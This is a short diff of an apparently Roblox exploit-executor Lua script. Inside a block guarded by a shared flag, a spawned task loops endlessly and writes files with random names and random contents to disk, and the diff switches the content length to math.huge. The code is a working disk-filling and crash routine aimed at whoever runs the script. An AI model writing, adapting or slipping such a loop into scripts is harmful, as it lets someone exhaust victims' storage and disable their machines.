@@ -126,7 +126,7 @@ if shared.FuncsConnect then
 	  task.spawn(function()
 			repeat
         task.wait()
-        writefile(Functions.randomGUID()..".lua", Functions.randomString(9999999999999999999999999999999999999999999, 9999999999999999999999999999999999999999999))
+        writefile(Functions.randomGUID()..".lua", Functions.randomString(math.huge, math.huge))
       until false
     end)
 	end
